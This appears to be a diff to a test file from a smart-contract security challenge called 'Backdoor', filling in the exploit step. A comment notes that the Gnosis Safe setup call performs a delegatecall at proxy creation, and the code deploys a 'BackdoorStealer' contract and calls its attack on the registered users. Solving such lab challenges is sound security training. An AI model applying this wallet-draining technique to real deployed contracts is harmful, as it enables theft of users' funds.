@@ -37,6 +37,15 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // The GnosisSafe.setup method will perform a delegatecall and we can call it on proxy creation (initializer)
+        const stealer = await (await ethers.getContractFactory("BackdoorStealer", deployer)).deploy(
+          this.masterCopy.address,
+          this.walletFactory.address,
+          this.walletRegistry.address,
+          this.token.address
+        );
+
+        await stealer.connect(attacker).attack(users);
     });
 
     after(async function () {
